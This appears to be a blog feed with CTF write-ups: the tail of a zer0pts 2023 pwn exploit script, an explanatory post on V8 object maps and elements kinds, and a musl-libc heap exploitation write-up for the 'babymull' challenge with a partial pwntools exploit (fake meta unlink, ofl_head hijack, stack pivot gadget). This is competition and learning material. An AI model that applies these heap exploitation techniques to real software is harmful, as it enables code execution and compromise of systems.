+= '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+' code += '&gt;+' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++' code += '&gt;+' code += '&gt;+' code += '&gt;+' code += '&gt;+' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++' code += '&gt;+++++' code += '&gt;[+' + '&gt;' * 0xc3 # ret sh = remote('pwn.2023.zer0pts.com','9004') sh.sendline(code) sh.interactive() # zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}]]></summary></entry><entry><title type="html">v8 basic</title><link href="http://localhost:4000/v8/2022/06/14/v8-basic.html" rel="alternate" type="text/html" title="v8 basic" /><published>2022-06-14T13:00:20+08:00</published><updated>2022-06-14T13:00:20+08:00</updated><id>http://localhost:4000/v8/2022/06/14/v8-basic</id><content type="html" xml:base="http://localhost:4000/v8/2022/06/14/v8-basic.html"><![CDATA[<p>在js引擎中，属性访问是一项非常复杂的工作，涉及到了原型链查找，interceptor，field tracking等非常多的机制，在这里进行一个归纳与总结</p>

<h2 id="representation">representation</h2>

<p>代表一个对象在内存中的存储方式，以格的形式设计</p>

<p><img src="/imgs/image-20230613225217526.png" alt="image-20230613225217526" /></p>

<p>Smi为31位整数，HeapObject为任意在堆上的对象指针，Double较为特别，分为在堆上的MutableHeapNumber结构指针和直接存储的unbox double</p>

<p>其中Smi转变为Double需要分配一个MutableHeapNumber存入，将Double转变为Tagged需要将MutableHeapNumber转换为HeapNumber</p>

<p>Smi到Tagged以及HeapObject到Tagged可以无需修改对象，这也是in-place field representation generalization的前提。</p>

<h2 id="map">map</h2>

<p>map是描述对象布局的重要结构，包含众多成员，下面选取一些重要的进行介绍</p>

<h3 id="descriptorarray">DescriptorArray</h3>

<p>存储对象所拥有的属性描述符，在源码中有如下注释，描述了该数组的结构</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// A DescriptorArray is a custom array that holds instance descriptors.</span>
<span class="c1">// It has the following layout:</span>
<span class="c1">//   Header:</span>
<span class="c1">//     [16:0  bits]: number_of_all_descriptors (including slack)   所有描述符个数，包括冗余，即容量</span>
<span class="c1">//     [32:16 bits]: number_of_descriptors                         已有的描述符个数</span>
<span class="c1">//     [64:32 bits]: raw_gc_state (used by GC)</span>
<span class="c1">//     [kEnumCacheOffset]: enum cache</span>
<span class="c1">//   Elements:</span>
<span class="c1">//     [kHeaderSize + 0]: first key (and internalized String)      键名，值存储在对象中，这里仅记录属性名</span>
<span class="c1">//     [kHeaderSize + 1]: first descriptor details (see PropertyDetails)  描述符细节，Smi类型，为Bitmap形式，对应类型PropertyDetails</span>
<span class="c1">//     [kHeaderSize + 2]: first value for constants / Smi(1) when not used 辅助值，可能存储字段的类型即字段的map</span>
<span class="c1">//   Slack:</span>
<span class="c1">//     [kHeaderSize + number of descriptors * 3]: start of slack</span>
<span class="c1">// The "value" fields store either values or field types. A field type is either</span>
<span class="c1">// FieldType::None(), FieldType::Any() or a weak reference to a Map. All other</span>
<span class="c1">// references are strong.</span>
</code></pre></div></div>

<p>map中的instance_descriptor一般为该结构</p>

<p>在一些版本如2019 qwb accessible的源码中，当JSHeapBroker启用时，可能会对map进行一些缓存操作，此时的instance_descriptor为一个包含PropertyDescriptor的数组，记录一些常用信息</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">PropertyDescriptor</span><span class="p">{</span>
    <span class="n">NameData</span><span class="o">*</span> <span class="n">key</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span> 			 <span class="c1">// 键名</span>
    <span class="n">ObjectData</span> <span class="o">*</span> <span class="n">value</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>        <span class="c1">// 键值</span>
    <span class="n">PropertyDetails</span> <span class="n">details</span> <span class="o">=</span> <span class="n">PropertyDetails</span><span class="o">::</span><span class="n">Empty</span><span class="p">();</span> <span class="c1">// Details</span>
    <span class="n">FieldIndex</span> <span class="n">field_index</span><span class="p">;</span>				 <span class="c1">// 在DescriptorArray中的index	</span>
    <span class="n">MapData</span><span class="o">*</span> <span class="n">field_owner</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>      <span class="c1">// 记录属性拥有者，避免重复查找对象链</span>
    <span class="n">ObjectData</span> <span class="o">*</span> <span class="n">filed_type</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>   <span class="c1">// 属性的类型（map）</span>
    <span class="kt">bool</span> <span class="n">is_unboxed_double_field</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span><span class="c1">// </span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="propertydetailspropertycelltype">PropertyDetails::PropertyCellType</h4>

<p>用于实现const field tracking，记录某个属性的可变性，针对性优化</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="k">class</span> <span class="nc">PropertyCellType</span> <span class="p">{</span>
  <span class="n">kMutable</span><span class="p">,</span>       <span class="c1">// Cell will no longer be tracked as constant.</span>
  <span class="n">kUndefined</span><span class="p">,</span>     <span class="c1">// The PREMONOMORPHIC of property cells.</span>
  <span class="n">kConstant</span><span class="p">,</span>      <span class="c1">// Cell has been assigned only once.</span>
  <span class="n">kConstantType</span><span class="p">,</span>  <span class="c1">// Cell has been assigned only one type.</span>
  <span class="c1">// Temporary value indicating an ongoing property cell state transition. Only</span>
  <span class="c1">// observable by a background thread.</span>
  <span class="n">kInTransition</span><span class="p">,</span>
  <span class="c1">// Value for dictionaries not holding cells, must be 0:</span>
  <span class="n">kNoCell</span> <span class="o">=</span> <span class="n">kMutable</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<h3 id="dependent-code">dependent code</h3>

<p>依赖数组，表示依赖当前map的编译优化代码</p>

<p>在编译时创建CompilationDenpendency的各种子类，如FieldTypeDependency，StableMapDependency等，实现抽象基类的Install函数，表明依赖位于某个Group中，如FieldTypeGroup，表示依赖于Map的某个FieldType，当map发生变化时，会检查新的FieldType是否变化，若有变化则Deoptimize对应Group的所有代码</p>

<p>在Map::GeneralizeField中可以看到一些相关的代码逻辑</p>

<h3 id="elements-kind">elements kind</h3>

<p>elements数组的类型，以格形式组织，简图如下，摘自v8 blogs <a href="https://v8.dev/blog/elements-kinds">Elements Kinds in V8</a></p>

<p><img src="/imgs/lattice.svg" alt="lattice" /></p>

<p>当元素不能兼容类型时发生类型转换，如</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// packed smi </span>
<span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>   <span class="c1">//  packed double</span>
<span class="nx">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>    <span class="c1">// packed elements   (maybe recreate)</span>
<span class="nx">a</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>    <span class="c1">// holey elements</span>
</code></pre></div></div>

<p>可以使用–trace-elements-transitions flag来跟踪类型变化</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elements transition <span class="o">[</span>PACKED_SMI_ELEMENTS -&gt; PACKED_DOUBLE_ELEMENTS] <span class="k">in</span> ~+14 at ./test1.js:1 <span class="k">for </span>0x0ece001cc4cd &lt;JSArray[3]&gt; from 0x0ece0011ac7d &lt;FixedArray[3]&gt; to 0x0ece001cc4dd &lt;FixedDoubleArray[3]&gt;

elements transition <span class="o">[</span>PACKED_ELEMENTS -&gt; HOLEY_ELEMENTS] <span class="k">in</span> ~+38 at ./test1.js:1 <span class="k">for </span>0x0ece001cc4cd &lt;JSArray[3]&gt; from 0x0ece001cc519 &lt;FixedArray[3]&gt; to 0x0ece001cc551 &lt;FixedArray[47]&gt;
</code></pre></div></div>

<p>目前最新版完整定义位于<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/">v8</a>/<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/">src</a>/<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/">objects</a>/<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/elements-kind.h">elements-kind.h</a></p>

<h3 id="map-mechainism">map mechainism</h3>

<h4 id="map-deprecate-and-migration">map deprecate and migration</h4>

<p>当两个对象共用一个mapA时，一个对象通过操作派生出来新的mapB，那么这时mapA被deprecate</p>

<p>再次涉及到map相关的操作时，另一个对象需要从deprecated mapA迁移到mapB，一般由runtime来完成这个操作</p>

<p>map deprecate一般情况下会导致dependent code被deoptimize</p>

<h4 id="field-generalization">field generalization</h4>]]></content><author><name></name></author><category term="v8" /><summary type="html"><![CDATA[在js引擎中，属性访问是一项非常复杂的工作，涉及到了原型链查找，interceptor，field tracking等非常多的机制，在这里进行一个归纳与总结]]></summary></entry><entry><title type="html">2021 祥云杯 babymull</title><link href="http://localhost:4000/ctf/2021/12/23/babymull.html" rel="alternate" type="text/html" title="2021 祥云杯 babymull" /><published>2021-12-23T16:20:22+08:00</published><updated>2021-12-23T16:20:22+08:00</updated><id>http://localhost:4000/ctf/2021/12/23/babymull</id><content type="html" xml:base="http://localhost:4000/ctf/2021/12/23/babymull.html"><![CDATA[<p>1.2.2的musl-libc利用, 题目给了一个gift函数可以实现一个已知地址一字节置零和泄露已知地址的64位数据   实际上漏洞也就是这个了</p>

<p>题目开了seccomp</p>

<p><img src="/imgs/wp.png" alt="wp.png" /></p>

<p>所以采用orw方式读取flag</p>

<hr />

<h1 id="题目条件">题目条件</h1>

<h2 id="预定义的一些结构">预定义的一些结构</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">buffdes</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">pBuf</span><span class="p">;</span>
  <span class="n">_QWORD</span> <span class="n">size</span><span class="p">;</span>
<span class="p">};</span>
<span class="n">buffdes</span> <span class="o">*</span> <span class="n">bufflist</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</code></pre></div></div>

<p>提供了5个操作</p>

<p>add</p>

<p><img src="/imgs/add1.png" alt="add1.png" /></p>

<p><img src="/imgs/add2.png" alt="add2.png" /></p>

<p>dele</p>

<p><img src="/imgs/dele.png" alt="dele.png" /></p>

<p>show 只能使用一次</p>

<p><img src="/imgs/show.png" alt="show.png" /></p>

<p>gift 同样只能用一次</p>

<p><img src="/imgs/gift.png" alt="gift.png" /></p>

<p>以及一个exit</p>

<h1 id="思路">思路</h1>

<h2 id="泄露libc">泄露libc</h2>

<p>首先注意到<code class="language-plaintext highlighter-rouge">buffdes</code>的结构里, <code class="language-plaintext highlighter-rouge">name</code>与<code class="language-plaintext highlighter-rouge">pbuff</code>紧紧相邻, 并且仔细观察<code class="language-plaintext highlighter-rouge">add</code>函数中的复制操作, <strong>并未对<code class="language-plaintext highlighter-rouge">name</code>数组添加尾缀零</strong> 所以只要能够让<code class="language-plaintext highlighter-rouge">name[15]</code>非零, 且<code class="language-plaintext highlighter-rouge">pbuff</code>是<code class="language-plaintext highlighter-rouge">mmap</code>得到的空间, 就可以计算出<code class="language-plaintext highlighter-rouge">libc</code>的基址</p>

<h2 id="攻击面">攻击面</h2>

<p><code class="language-plaintext highlighter-rouge">musl-libc</code>对<code class="language-plaintext highlighter-rouge">meta</code>的<code class="language-plaintext highlighter-rouge">unlink</code>操作没有检查,可以伪造<code class="language-plaintext highlighter-rouge">fake_meta</code>的<code class="language-plaintext highlighter-rouge">prev</code>和<code class="language-plaintext highlighter-rouge">next</code>域来实现一个任意地址写</p>

<p>伪造<code class="language-plaintext highlighter-rouge">meta</code>需要的条件可以通过分析源码得到</p>

<p>在<code class="language-plaintext highlighter-rouge">musl-libc</code>中有一个与<code class="language-plaintext highlighter-rouge">IO_list_all</code>相似的变量<code class="language-plaintext highlighter-rouge">ofl_head</code>, 在<code class="language-plaintext highlighter-rouge">exit</code>函数中调用的<code class="language-plaintext highlighter-rouge">__stdin_exit</code>函数中使用:</p>

<p><img src="/imgs/exit.png" alt="exit.png" /></p>

<p><img src="/imgs/__stdio_exit.png" alt="__stdio_exit.png" /></p>

<p><code class="language-plaintext highlighter-rouge">close_file</code>中：</p>

<p><img src="/imgs/close_file.png" alt="close_file.png" /></p>

<p>所以将ofl_head修改为可控的地址之后，再将<code class="language-plaintext highlighter-rouge">f→write</code>改为这样一个<code class="language-plaintext highlighter-rouge">gadget</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000000004bcf3</span><span class="o">:</span> <span class="n">mov</span> <span class="n">rsp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">]</span> <span class="p">;</span> <span class="n">jmp</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">]</span>
</code></pre></div></div>

<p>就可以直接迁栈到可控内存中</p>

<p>完整exp</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./babymull"</span><span class="p">)</span>

<span class="n">size_class</span> <span class="o">=</span> <span class="p">[</span>
	<span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span>
	<span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span>
	<span class="mi">18</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span>
	<span class="mi">36</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span>
	<span class="mi">72</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span>
	<span class="mi">146</span><span class="p">,</span> <span class="mi">170</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span>
	<span class="mi">292</span><span class="p">,</span> <span class="mi">340</span><span class="p">,</span> <span class="mi">409</span><span class="p">,</span> <span class="mi">511</span><span class="p">,</span>
	<span class="mi">584</span><span class="p">,</span> <span class="mi">682</span><span class="p">,</span> <span class="mi">818</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span>
	<span class="mi">1169</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1637</span><span class="p">,</span> <span class="mi">2047</span><span class="p">,</span>
	<span class="mi">2340</span><span class="p">,</span> <span class="mi">2730</span><span class="p">,</span> <span class="mi">3276</span><span class="p">,</span> <span class="mi">4095</span><span class="p">,</span>
	<span class="mi">4680</span><span class="p">,</span> <span class="mi">5460</span><span class="p">,</span> <span class="mi">6552</span><span class="p">,</span> <span class="mi">8191</span>
<span class="p">]</span>
<span class="k">def</span> <span class="nf">find_offset_fit_class</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">size_class</span><span class="p">)):</span>
        <span class="k">if</span> <span class="n">size_class</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">offset</span> <span class="ow">and</span> <span class="n">size_class</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">offset</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">i</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
<span class="k">def</span> <span class="nf">CountTailingZero</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="n">debruijn32</span> <span class="o">=</span> <span class="p">[</span>
		<span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span>
		<span class="mi">31</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">14</span>
    <span class="p">]</span>
    <span class="k">return</span> <span class="n">debruijn32</span><span class="p">[((</span><span class="n">n</span><span class="o">&amp;-</span><span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="mh">0x076be629</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">27</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">CountLeadingZero</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
    <span class="n">n</span> <span class="o">|=</span> <span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
    <span class="n">n</span> <span class="o">|=</span> <span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span>
    <span class="n">n</span> <span class="o">|=</span> <span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
    <span class="n">n</span> <span class="o">|=</span> <span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
    <span class="n">n</span> <span class="o">|=</span> <span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
    <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="mi">31</span><span class="o">-</span><span class="n">CountTailingZero</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">size_to_class</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">4</span>
    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">n</span> 
    <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="mi">28</span><span class="o">-</span><span class="n">CountLeadingZero</span><span class="p">(</span><span class="n">n</span><span class="p">))</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mi">8</span>
    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="n">size_class</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]):</span> <span class="n">i</span><span class="o">+=</span> <span class="mi">2</span>
    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="n">size_class</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">):</span> <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
    <span class="k">return</span> <span class="n">i</span>
<span class="k">class</span> <span class="nc">fakeMeta</span><span class="p">:</span>
    <span class="n">prev</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="nb">next</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">mem</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">avail_mask</span><span class="o">=</span><span class="mi">0</span>
    <span class="n">freed_mask</span><span class="o">=</span><span class="mi">0</span>
    <span class="n">last_idx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">freeable</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">sizeclass</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">maplen</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">def</span> <span class="nf">Mask</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">avail_mask</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">freed_mask</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">Payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">prev</span><span class="p">)</span>
        <span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="nb">next</span><span class="p">)</span>
        <span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">mem</span><span class="p">)</span>
        <span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Mask</span><span class="p">())</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">last_idx</span> <span class="o">&amp;</span> <span class="mh">0x1f</span>
        <span class="n">flag</span> <span class="o">|=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">freeable</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span>
        <span class="n">flag</span> <span class="o">|=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">sizeclass</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span>
        <span class="n">flag</span> <span class="o">|=</span> <span class="bp">self</span><span class="p">.</span><span class="n">maplen</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
        <span class="n">Payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">Payload</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Name: "</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Content: "</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
    <span class="k">return</span>
<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">return</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">return</span> 
